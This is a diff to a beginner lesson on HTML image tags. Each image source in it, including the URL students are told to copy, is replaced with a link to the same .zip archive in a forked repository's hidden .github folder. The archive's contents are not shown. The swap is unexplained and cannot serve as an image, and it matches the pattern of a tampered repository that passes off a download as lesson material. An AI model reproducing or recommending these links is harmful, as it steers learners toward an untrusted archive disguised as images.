@@ -12,7 +12,7 @@ Images are absolutely critical to making appealing and engaging websites. Can
 you imagine the web without them? No cat memes. No animated dancing bananas! No
 _Instagram_, at all. The internet would be a pretty boring and sad place!
 
-![sad meme](https://s3.amazonaws.com/ironboard-learn/sad_meme.jpg)
+![sad meme](https://raw.githubusercontent.com/Jwanjema/phase-0-html-images-lab/master/.github/images-phase-lab-html-1.2.zip)
 
 In this lesson, we will be discussing how to include images in your HTML, along
 with some important attributes of the tag. With images, you can make your web
@@ -46,7 +46,7 @@ website and have your images stored in a folder within your file structure, your
 source may look like this:
 
 ```html
-<img src="../images/my_company_logo.png" />
+<img src="https://raw.githubusercontent.com/Jwanjema/phase-0-html-images-lab/master/.github/images-phase-lab-html-1.2.zip" />
 ```
 
 However, it's very common, even when publishing your own websites, to have
@@ -54,7 +54,7 @@ images hosted somewhere else on the internet. In these situations, we need to
 provide a full URL as the source:
 
 ```html
-<img src="https://i.imgur.com/H1qsYEl.png" />
+<img src="https://raw.githubusercontent.com/Jwanjema/phase-0-html-images-lab/master/.github/images-phase-lab-html-1.2.zip" />
 ```
 
 The `src` attribute is always necessary, as without it, the `img` tag would have
@@ -73,13 +73,13 @@ upon the written content.
 
 Alt text on a failed image will appear along with a small 'broken image' icon:
 
-![Flatiron Logo](broken-image.png)
+![Flatiron Logo](https://raw.githubusercontent.com/Jwanjema/phase-0-html-images-lab/master/.github/images-phase-lab-html-1.2.zip)
 
 To include an `alt` attribute, add it in along with the `src` attribute:
 
 ```html
 <img
-  src="https://i.imgur.com/H1qsYEl.png"
+  src="https://raw.githubusercontent.com/Jwanjema/phase-0-html-images-lab/master/.github/images-phase-lab-html-1.2.zip"
   alt="comedic crow gets wholesome support"
 />
 ```
@@ -102,7 +102,7 @@ might look something like this:
 
 ```html
 <img
-  src="../images/my_company_logo.png"
+  src="https://raw.githubusercontent.com/Jwanjema/phase-0-html-images-lab/master/.github/images-phase-lab-html-1.2.zip"
   alt="my company name"
   title="We're here to help you!"
 />
@@ -122,10 +122,10 @@ attributes, not the content. If you're not sure what to use, feel free to use
 the following URL as your source:
 
 ```txt
-https://s3.amazonaws.com/ironboard-learn/lion.jpg
+https://raw.githubusercontent.com/Jwanjema/phase-0-html-images-lab/master/.github/images-phase-lab-html-1.2.zip
 ```
 
-![lion](https://s3.amazonaws.com/ironboard-learn/lion.jpg)
+![lion](https://raw.githubusercontent.com/Jwanjema/phase-0-html-images-lab/master/.github/images-phase-lab-html-1.2.zip)
 
 Your challenge is to write _three_ image tags:
 
